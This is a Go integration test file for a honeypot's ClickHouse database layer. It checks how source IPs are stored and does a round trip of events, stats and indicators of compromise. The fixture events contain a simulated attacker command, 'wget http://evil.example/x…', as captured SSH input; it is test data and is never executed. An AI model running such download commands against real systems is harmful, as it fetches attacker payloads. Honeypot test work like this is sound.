package database

import (
	"context"
	"os"
	"strconv"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/config"
)

// chTestConfig builds a DatabaseConfig from QPOT_TEST_CH_* env vars, skipping
// the test entirely when QPOT_TEST_CLICKHOUSE != 1. This keeps the integration
// test out of the normal unit run while letting us exercise the real driver.
func chTestConfig(t *testing.T) *config.DatabaseConfig {
	t.Helper()
	if os.Getenv("QPOT_TEST_CLICKHOUSE") != "1" {
		t.Skip("set QPOT_TEST_CLICKHOUSE=1 to run ClickHouse integration tests")
	}
	port := 9000
	if p := os.Getenv("QPOT_TEST_CH_PORT"); p != "" {
		port, _ = strconv.Atoi(p)
	}
	host := os.Getenv("QPOT_TEST_CH_HOST")
	if host == "" {
		host = "127.0.0.1"
	}
	return &config.DatabaseConfig{
		Type:     "clickhouse",
		Host:     host,
		Port:     port,
		Username: envOr("QPOT_TEST_CH_USER", "qpot"),
		Password: envOr("QPOT_TEST_CH_PASS", "qpotpass"),
		Database: envOr("QPOT_TEST_CH_DB", "qpot"),
	}
}

func envOr(k, d string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return d
}

func connectCH(t *testing.T) Database {
	t.Helper()
	db, err := New(chTestConfig(t))
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	if err := db.Connect(ctx); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	if err := db.InitializeSchema(ctx); err != nil {
		t.Fatalf("InitializeSchema: %v", err)
	}
	t.Cleanup(func() { db.Close() })
	return db
}

// TestCHSourceIPHandling probes how the IPv4 source_ip column behaves with the
// range of values the honeypot pipeline actually produces: public IPv4, IPv6,
// empty, and malformed. This is exactly the case the data-pipeline audit
// flagged as a possible insert failure.
func TestCHSourceIPHandling(t *testing.T) {
	db := connectCH(t)
	ctx := context.Background()

	cases := []struct {
		name string
		ip   string
	}{
		{"ipv4", "203.0.113.7"},
		{"ipv6", "2001:db8::dead:beef"},
		{"empty", ""},
		{"malformed", "not-an-ip"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ev := &Event{
				Timestamp: time.Now().UTC(),
				Honeypot:  "cowrie",
				SourceIP:  c.ip,
				EventType: "login_failed",
				Username:  "root",
			}
			err := db.InsertEvent(ctx, ev)
			if err != nil {
				// Record the behavior; for ipv6/empty/malformed this documents
				// whether the IPv4 column rejects them (a real data-loss path).
				t.Logf("InsertEvent(source_ip=%q) FAILED: %v", c.ip, err)
			} else {
				t.Logf("InsertEvent(source_ip=%q) OK", c.ip)
			}
		})
	}
}

// TestCHRoundTrip verifies the core collect→store→read path against a real
// ClickHouse: insert events, then read them back and aggregate stats/IOCs.
func TestCHRoundTrip(t *testing.T) {
	db := connectCH(t)
	ctx := context.Background()
	since := time.Now().Add(-time.Hour)

	const n = 25
	evs := make([]*Event, n)
	for i := 0; i < n; i++ {
		evs[i] = &Event{
			Timestamp:  time.Now().UTC(),
			Honeypot:   "cowrie",
			SourceIP:   "198.51.100." + strconv.Itoa(i%254+1),
			SourcePort: 40000 + i,
			DestPort:   22,
			Protocol:   "ssh",
			EventType:  "command",
			Username:   "root",
			Command:    "wget http://evil.example/x" + strconv.Itoa(i),
			Metadata:   map[string]string{"k": "v"},
		}
	}
	if err := db.InsertEvents(ctx, evs); err != nil {
		t.Fatalf("InsertEvents: %v", err)
	}

	// ClickHouse inserts are async-flushed to disk but readable immediately on
	// the same connection; allow a brief moment regardless.
	time.Sleep(500 * time.Millisecond)

	got, err := db.GetEvents(ctx, EventFilter{Limit: 100, Honeypots: []string{"cowrie"}})
	if err != nil {
		t.Fatalf("GetEvents: %v", err)
	}
	if len(got) == 0 {
		t.Error("GetEvents returned 0 events after inserting 25")
	}
	for _, e := range got {
		if e.Honeypot != "cowrie" {
			t.Errorf("GetEvents honeypot filter leaked %q", e.Honeypot)
		}
		if e.EventType == "" {
			t.Error("read-back event has empty event_type")
		}
	}

	stats, err := db.GetStats(ctx, since)
	if err != nil {
		t.Fatalf("GetStats: %v", err)
	}
	if stats.TotalEvents <= 0 {
		t.Errorf("GetStats TotalEvents=%d, want >0", stats.TotalEvents)
	}

	// IOC path.
	ioc := &IOC{
		ID: "ip:198.51.100.5:cowrie", Type: "ip", Value: "198.51.100.5",
		Honeypot: "cowrie", SourceIP: "198.51.100.5",
		FirstSeen: time.Now().UTC(), LastSeen: time.Now().UTC(), Count: 1,
	}
	if err := db.InsertIOC(ctx, ioc); err != nil {
		t.Fatalf("InsertIOC: %v", err)
	}
	time.Sleep(300 * time.Millisecond)
	iocs, err := db.GetIOCs(ctx, IOCFilter{Limit: 10})
	if err != nil {
		t.Fatalf("GetIOCs: %v", err)
	}
	if len(iocs) == 0 {
		t.Error("GetIOCs returned 0 after inserting one")
	}
}
